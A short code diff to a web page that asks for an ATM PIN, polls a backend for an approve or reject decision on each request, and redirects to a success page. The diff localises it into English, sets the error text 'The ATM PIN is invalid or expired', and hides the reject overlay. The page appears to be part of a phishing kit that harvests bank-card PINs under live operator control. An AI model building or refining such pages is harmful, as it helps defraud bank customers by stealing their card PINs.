@@ -101,7 +101,7 @@
   }
   .btn-submit:hover { background-color: #6f1626; }
   .btn-submit:disabled { background-color: var(--anabi); opacity: .55; cursor: not-allowed; box-shadow: none; }
-  .error-msg { color: #c0392b; font-size: 13px; margin-top: 12px; display: none; text-align: center; }
+  .error-msg { color: #c0392b; font-size: 13px; font-weight: 800; margin-top: 12px; display: none; text-align: center; }
 
   .overlay {
     position: fixed; inset: 0;
@@ -222,7 +222,7 @@
 
             if (data.stage === 'success' && data.status === 'success') {
               stopPoll();
-              window.location.href = 'success.html?id=' + requestId;
+              window.location.href = 'success-en.html?id=' + requestId;
               return;
             }
 
@@ -230,8 +230,9 @@
               stopPoll();
               waitOverlay.classList.remove('show');
               pinForm.style.display = 'block';
+              document.getElementById('errorMsg').textContent = 'The ATM PIN is invalid or expired';
               document.getElementById('errorMsg').style.display = 'block';
-              rejectOverlay.classList.add('show');
+              rejectOverlay.classList.remove('show');
               return;
             }
           })
